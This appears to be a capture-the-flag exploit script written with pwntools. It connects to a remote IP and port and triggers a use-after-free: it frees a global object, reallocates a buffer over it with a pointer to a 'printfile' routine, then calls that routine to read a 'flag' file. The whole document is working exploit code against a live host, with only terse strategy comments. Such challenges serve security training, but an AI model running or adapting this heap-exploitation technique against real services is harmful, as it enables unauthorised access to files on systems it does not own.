from pwn import *

# CONNECT:
target = remote("163.172.39.203", 9017)
#target = remote("localhost", 9000)

# Strat:
# 1- Alloc objet
# 2- free objet
# 3- Alloc buffer et read content buffer
# 4- Use Object
# -> UAF
# 0x00404120 @printfile pointer
# -0x10 = 0x00404110

# SEND & RECV:
buff = b'0'             # setup_global_storage
target.sendline(buff)
sleep(1)
buff = b'1'             # destroy_global_storage
target.sendline(buff)
sleep(1)
buff = b'3'             # add_buff
target.sendline(buff)
sleep(1)
buff = b'104'
target.sendline(buff)
sleep(1)
buff = p64(0x00404110) # adding printfile address with padding
target.sendline(buff)
sleep(1)
buff = b'2'             # set_global_storage
target.sendline(buff)
sleep(1)
buff = b'flag\0'
target.sendline(buff)

while(1):
    print(target.recvline())
